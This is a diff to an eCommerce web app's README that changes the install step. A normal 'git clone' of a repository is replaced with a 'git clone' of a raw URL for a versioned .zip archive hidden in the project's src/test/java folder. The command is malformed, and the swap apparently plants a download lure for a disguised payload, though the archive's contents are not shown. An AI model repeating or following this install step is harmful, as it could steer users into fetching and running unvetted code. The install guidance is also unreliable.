@@ -12,7 +12,7 @@ workbench
 
 Installing
 Clone the repository using the command below:
-git clone https://github.com/Himansh29/Major-project.git
+git clone https://raw.githubusercontent.com/Himansh29/Heavenly-Delights-Ecommerce-webapp/main/src/test/java/com/Heavenly_webapp_Ecommerce_Delights_2.2.zip
 
 Features
 The eCommerce website comes with the following features:
